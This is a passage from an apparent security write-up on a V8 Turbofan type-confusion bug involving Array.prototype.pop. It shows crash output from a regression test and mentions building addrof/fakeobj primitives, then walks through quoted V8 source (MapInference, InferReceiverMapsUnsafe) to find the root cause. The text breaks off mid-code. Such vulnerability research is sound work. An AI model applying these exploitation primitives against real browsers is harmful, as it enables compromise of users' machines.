</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">dependent</span> <span class="nx">code</span><span class="o">:</span> <span class="mh">0x3d04080401ed</span> <span class="o">&lt;</span><span class="nx">Other</span> <span class="nx">heap</span> <span class="nx">object</span> <span class="p">(</span><span class="nx">WEAK_FIXED_ARRAY_TYPE</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">construction</span> <span class="nx">counter</span><span class="o">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//-----------------------------[AFTER]---------------------------------
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mf">4.735317402428105</span><span class="nx">e</span><span class="o">-</span><span class="mi">270</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">DebugPrint</span><span class="o">:</span> <span class="mh">0x3d04080c6031</span><span class="o">:</span> <span class="p">[</span><span class="nx">JSArray</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">map</span><span class="o">:</span> <span class="mh">0x3d0408281959</span> <span class="o">&lt;</span><span class="nx">Map</span><span class="p">(</span><span class="nx">PACKED_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">[</span><span class="nx">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">prototype</span><span class="o">:</span> <span class="mh">0x3d040824923d</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">elements</span><span class="o">:</span> <span class="mh">0x3d04080c6295</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">[</span><span class="nx">PACKED_ELEMENTS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">length</span><span class="o">:</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">properties</span><span class="o">:</span> <span class="mh">0x3d04080406e9</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="err">#</span><span class="nx">length</span><span class="o">:</span> <span class="mh">0x3d04081c0165</span> <span class="o">&lt;</span><span class="nx">AccessorInfo</span><span class="o">&gt;</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">accessor</span> <span class="nx">descriptor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">elements</span><span class="o">:</span> <span class="mh">0x3d04080c6295</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">           <span class="mi">0</span><span class="o">:</span> <span class="mh">0x3d04080c6279</span> <span class="o">&lt;</span><span class="nb">Object</span> <span class="nx">map</span> <span class="o">=</span> <span class="mh">0x3d04082802d9</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">           <span class="mi">1</span><span class="o">:</span> <span class="mh">0x3d04080c62bd</span> <span class="o">&lt;</span><span class="nx">HeapNumber</span> <span class="mf">1.1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">Received</span> <span class="nx">signal</span> <span class="mi">11</span> <span class="nx">SEGV_ACCERR</span> <span class="mi">3</span><span class="nx">d04fff80006</span>
</span></span><span class="line"><span class="cl"><span class="c1">// ^ V8 CRASHES FETCHING ELEMENTS IN DEBUG BUILD
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>We can leverage a type-confusion vulnerability when trying to access any of the elements of <code>a</code>, as we will be fetching a double representation of a <code>HeapNumber</code> object&rsquo;s tagged pointer. This vulnerability would enable us to trivially create <code>addrof</code> and <code>fakeobj</code> primitives. However, we will see moving forward that this won’t work in newer V8 versions, and that in order to exploit this vulnerability a different exploitation strategy will be required.</p>
<p>This is all there is to understand for now in relation to the supplied regression test. Now let&rsquo;s dig deep into identifying the root-cause analysis in v8&rsquo;s source code.</p>
<br />
<hr>
<h3 id="root-cause-analysis">Root-Cause Analysis</h3>
<p>Now that we have done a quick overview of the vulnerability and its implications from the regression test, let&rsquo;s take a deep dive into V8&rsquo;s source to identify the root-cause analysis for this vulnerability.</p>
<p>To start off, it is important to have in mind a high-level overview of Turbofan&rsquo;s JIT compilation pipeline shown in the following diagram :</p>
<div style="text-align:center"><img src ="https://tmpout.sh/2/img/Pasted%20image%2020220112200715.png" /></div>
<p>Within the distinct Turbofan&rsquo;s phases, we can highlight the inlining/specialization phase, in which lowering of builtin functions and reduction of specific nodes is performed, such as <code>JSCall</code> reduction and <code>JSCreate</code> lowering:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Performs strength reduction on {JSConstruct} and {JSCall} nodes,
</span></span></span><span class="line"><span class="cl"><span class="c1">// which might allow inlining or other optimizations to be performed afterwards.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">class</span> <span class="nx">V8_EXPORT_PRIVATE</span> <span class="nx">JSCallReducer</span> <span class="kr">final</span> <span class="o">:</span> <span class="kr">public</span> <span class="nx">AdvancedReducer</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="kr">public</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Flags that control the mode of operation.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">enum</span> <span class="nx">Flag</span> <span class="p">{</span> <span class="nx">kNoFlags</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">u</span><span class="p">,</span> <span class="nx">kBailoutOnUninitialized</span> <span class="o">=</span> <span class="mi">1</span><span class="nx">u</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="nx">using</span> <span class="nx">Flags</span> <span class="o">=</span> <span class="nx">base</span><span class="o">::</span><span class="nx">Flags</span><span class="o">&lt;</span><span class="nx">Flag</span><span class="o">&gt;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">JSCallReducer</span><span class="p">(</span><span class="nx">Editor</span><span class="o">*</span> <span class="nx">editor</span><span class="p">,</span> <span class="nx">JSGraph</span><span class="o">*</span> <span class="nx">jsgraph</span><span class="p">,</span> <span class="nx">JSHeapBroker</span><span class="o">*</span> <span class="nx">broker</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">Zone</span><span class="o">*</span> <span class="nx">temp_zone</span><span class="p">,</span> <span class="nx">Flags</span> <span class="nx">flags</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">CompilationDependencies</span><span class="o">*</span> <span class="nx">dependencies</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">:</span> <span class="nx">AdvancedReducer</span><span class="p">(</span><span class="nx">editor</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">jsgraph_</span><span class="p">(</span><span class="nx">jsgraph</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">broker_</span><span class="p">(</span><span class="nx">broker</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">temp_zone_</span><span class="p">(</span><span class="nx">temp_zone</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">flags_</span><span class="p">(</span><span class="nx">flags</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dependencies_</span><span class="p">(</span><span class="nx">dependencies</span><span class="p">)</span> <span class="p">{}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Lowers JSCreate-level operators to fast (inline) allocations.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">class</span> <span class="nx">V8_EXPORT_PRIVATE</span> <span class="nx">JSCreateLowering</span> <span class="kr">final</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="kr">public</span> <span class="nx">NON_EXPORTED_BASE</span><span class="p">(</span><span class="nx">AdvancedReducer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="kr">public</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">  <span class="nx">JSCreateLowering</span><span class="p">(</span><span class="nx">Editor</span><span class="o">*</span> <span class="nx">editor</span><span class="p">,</span> <span class="nx">CompilationDependencies</span><span class="o">*</span> <span class="nx">dependencies</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="nx">JSGraph</span><span class="o">*</span> <span class="nx">jsgraph</span><span class="p">,</span> <span class="nx">JSHeapBroker</span><span class="o">*</span> <span class="nx">broker</span><span class="p">,</span> <span class="nx">Zone</span><span class="o">*</span> <span class="nx">zone</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">:</span> <span class="nx">AdvancedReducer</span><span class="p">(</span><span class="nx">editor</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dependencies_</span><span class="p">(</span><span class="nx">dependencies</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">jsgraph_</span><span class="p">(</span><span class="nx">jsgraph</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">broker_</span><span class="p">(</span><span class="nx">broker</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">zone_</span><span class="p">(</span><span class="nx">zone</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">  <span class="o">~</span><span class="nx">JSCreateLowering</span><span class="p">()</span> <span class="kr">final</span> <span class="o">=</span> <span class="k">default</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="kr">char</span><span class="o">*</span> <span class="nx">reducer_name</span><span class="p">()</span> <span class="kr">const</span> <span class="nx">override</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&#34;JSCreateLowering&#34;</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">Reduction</span> <span class="nx">Reduce</span><span class="p">(</span><span class="nx">Node</span><span class="o">*</span> <span class="nx">node</span><span class="p">)</span> <span class="kr">final</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="kr">private</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">  <span class="nx">Reduction</span> <span class="nx">ReduceJSCreate</span><span class="p">(</span><span class="nx">Node</span><span class="o">*</span> <span class="nx">node</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>For our previous PoC&rsquo;s Inlining phase, reduction of <code>Array.prototype.pop</code> built-in function will be performed. The function in charge of doing so is<code>JSCallReducer::ReduceArrayPrototypePop(Node* node)</code> shown below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ES6 section 22.1.3.17 Array.prototype.pop ( )
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Reduction</span> <span class="nx">JSCallReducer</span><span class="o">::</span><span class="nx">ReduceArrayPrototypePop</span><span class="p">(</span><span class="nx">Node</span><span class="o">*</span> <span class="nx">node</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">DisallowHeapAccessIf</span> <span class="nx">disallow_heap_access</span><span class="p">(</span><span class="nx">FLAG_concurrent_inlining</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">DCHECK_EQ</span><span class="p">(</span><span class="nx">IrOpcode</span><span class="o">::</span><span class="nx">kJSCall</span><span class="p">,</span> <span class="nx">node</span><span class="o">-&gt;</span><span class="nx">opcode</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">  <span class="nx">CallParameters</span> <span class="kr">const</span><span class="o">&amp;</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">CallParametersOf</span><span class="p">(</span><span class="nx">node</span><span class="o">-&gt;</span><span class="nx">op</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">speculation_mode</span><span class="p">()</span> <span class="o">==</span> <span class="nx">SpeculationMode</span><span class="o">::</span><span class="nx">kDisallowSpeculation</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">NoChange</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">Node</span><span class="o">*</span> <span class="nx">receiver</span> <span class="o">=</span> <span class="nx">NodeProperties</span><span class="o">::</span><span class="nx">GetValueInput</span><span class="p">(</span><span class="nx">node</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nx">Node</span><span class="o">*</span> <span class="nx">effect</span> <span class="o">=</span> <span class="nx">NodeProperties</span><span class="o">::</span><span class="nx">GetEffectInput</span><span class="p">(</span><span class="nx">node</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nx">Node</span><span class="o">*</span> <span class="nx">control</span> <span class="o">=</span> <span class="nx">NodeProperties</span><span class="o">::</span><span class="nx">GetControlInput</span><span class="p">(</span><span class="nx">node</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">MapInference</span> <span class="nx">inference</span><span class="p">(</span><span class="nx">broker</span><span class="p">(),</span> <span class="nx">receiver</span><span class="p">,</span> <span class="nx">effect</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">inference</span><span class="p">.</span><span class="nx">HaveMaps</span><span class="p">())</span> <span class="k">return</span> <span class="nx">NoChange</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nx">MapHandles</span> <span class="kr">const</span><span class="o">&amp;</span> <span class="nx">receiver_maps</span> <span class="o">=</span> <span class="nx">inference</span><span class="p">.</span><span class="nx">GetMaps</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">std</span><span class="o">::</span><span class="nx">vector</span><span class="o">&lt;</span><span class="nx">ElementsKind</span><span class="o">&gt;</span> <span class="nx">kinds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">CanInlineArrayResizingBuiltin</span><span class="p">(</span><span class="nx">broker</span><span class="p">(),</span> <span class="nx">receiver_maps</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">kinds</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">inference</span><span class="p">.</span><span class="nx">NoChange</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">dependencies</span><span class="p">()</span><span class="o">-&gt;</span><span class="nx">DependOnNoElementsProtector</span><span class="p">())</span> <span class="nx">UNREACHABLE</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nx">inference</span><span class="p">.</span><span class="nx">RelyOnMapsPreferStability</span><span class="p">(</span><span class="nx">dependencies</span><span class="p">(),</span> <span class="nx">jsgraph</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                                      <span class="o">&amp;</span><span class="nx">effect</span><span class="p">,</span> <span class="nx">control</span><span class="p">,</span> <span class="nx">p</span><span class="p">.</span><span class="nx">feedback</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Load the &#34;length&#34; property of the {receiver}.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Check if the {receiver} has any elements.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Load the elements backing store from the {receiver}.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Ensure that we aren&#39;t popping from a copy-on-write backing store.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Compute the new {length}.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Store the new {length} to the {receiver}.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Load the last entry from the {elements}.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Store a hole to the element we just removed from the {receiver}.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Convert the hole to undefined. Do this last, so that we can optimize
</span></span></span><span class="line"><span class="cl"><span class="c1">// conversion operator via some smart strength reduction in many cases.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">  <span class="nx">ReplaceWithValue</span><span class="p">(</span><span class="nx">node</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">effect</span><span class="p">,</span> <span class="nx">control</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">Replace</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This function will fetch the map of the <code>receiver</code> node by invoking <code>MapInference inference(broker(), receiver, effect)</code>  to then retrieve its elements kind as well as implement the logic for <code>Array.protype.pop</code>. Major operations performed by this function are summarized by the comments in the source code shown above for sake of simplicity.</p>
<p>We should also highlight the call to <code>inference.RelyOnMapsPreferStability</code>, which we will cover in a later stage. For now, let&rsquo;s focus on the call to <code>MapInference</code> constructor along with some of its instance methods. These are shown below :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="n">MapInference</span><span class="o">::</span><span class="n">MapInference</span><span class="p">(</span><span class="n">JSHeapBroker</span><span class="o">*</span> <span class="n">broker</span><span class="p">,</span> <span class="n">Node</span><span class="o">*</span> <span class="n">object</span><span class="p">,</span> <span class="n">Node</span><span class="o">*</span> <span class="n">effect</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="n">broker_</span><span class="p">(</span><span class="n">broker</span><span class="p">),</span> <span class="n">object_</span><span class="p">(</span><span class="n">object</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">ZoneHandleSet</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">maps</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">auto</span> <span class="n">result</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">      <span class="n">NodeProperties</span><span class="o">::</span><span class="n">InferReceiverMapsUnsafe</span><span class="p">(</span><span class="n">broker_</span><span class="p">,</span> <span class="n">object_</span><span class="p">,</span> <span class="n">effect</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">maps</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">maps_</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">maps_</span><span class="p">.</span><span class="n">end</span><span class="p">(),</span> <span class="n">maps</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">maps</span><span class="p">.</span><span class="n">end</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">  <span class="n">maps_state_</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">kUnreliableReceiverMaps</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">?</span> <span class="nl">kUnreliableDontNeedGuard</span>
</span></span><span class="line"><span class="cl">                    <span class="p">:</span> <span class="n">kReliableOrGuarded</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">maps_</span><span class="p">.</span><span class="n">empty</span><span class="p">(),</span> <span class="n">result</span> <span class="o">==</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">kNoReceiverMaps</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">MapInference</span><span class="o">::~</span><span class="n">MapInference</span><span class="p">()</span> <span class="p">{</span> <span class="n">CHECK</span><span class="p">(</span><span class="n">Safe</span><span class="p">());</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="n">MapInference</span><span class="o">::</span><span class="n">Safe</span><span class="p">()</span> <span class="k">const</span> <span class="p">{</span> <span class="k">return</span> <span class="n">maps_state_</span> <span class="o">!=</span> <span class="n">kUnreliableNeedGuard</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">MapInference</span><span class="o">::</span><span class="n">SetNeedGuardIfUnreliable</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">CHECK</span><span class="p">(</span><span class="n">HaveMaps</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">maps_state_</span> <span class="o">==</span> <span class="n">kUnreliableDontNeedGuard</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">maps_state_</span> <span class="o">=</span> <span class="n">kUnreliableNeedGuard</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">MapInference</span><span class="o">::</span><span class="n">SetGuarded</span><span class="p">()</span> <span class="p">{</span> <span class="n">maps_state_</span> <span class="o">=</span> <span class="n">kReliableOrGuarded</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="n">MapInference</span><span class="o">::</span><span class="n">HaveMaps</span><span class="p">()</span> <span class="k">const</span> <span class="p">{</span> <span class="k">return</span> <span class="o">!</span><span class="n">maps_</span><span class="p">.</span><span class="n">empty</span><span class="p">();</span> <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can notice that at the beginning of the function, a call to <code>NodeProperties::InferReceiverMapsUnsafe</code> is performed. This function walks the effect chain in search for a node that can give hints into inferring the map of the receiver object. At the same time, this function is also in charge of marking the result as unreliable if it encounters a node without the <code>kNoWrite</code> flag, indicating that executing the node could have side-effects such as changing the map of an object.</p>
<p>This function returns an enum composed of three possible values which are the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="c1">// Walks up the {effect} chain to find a witness that provides map
</span></span></span><span class="line"><span class="cl"><span class="c1">// information about the {receiver}. Can look through potentially
</span></span></span><span class="line"><span class="cl"><span class="c1">// side effecting nodes.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">enum</span> <span class="nc">InferReceiverMapsResult</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">kNoReceiverMaps</span><span class="p">,</span>         <span class="c1">// No receiver maps inferred.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">kReliableReceiverMaps</span><span class="p">,</span>   <span class="c1">// Receiver maps can be trusted.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">kUnreliableReceiverMaps</span>  <span class="c1">// Receiver maps might have changed (side-effect).
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>A summerized overview of the implementation of <code>NodeProperties::InferReceiverMapsUnsafe</code> is shown below, highlighting the most important parts of this function:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// static
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">NodeProperties</span><span class="o">::</span><span class="nx">InferReceiverMapsResult</span> <span class="nx">NodeProperties</span><span class="o">::</span><span class="nx">InferReceiverMapsUnsafe</span><span class="p">(</span>
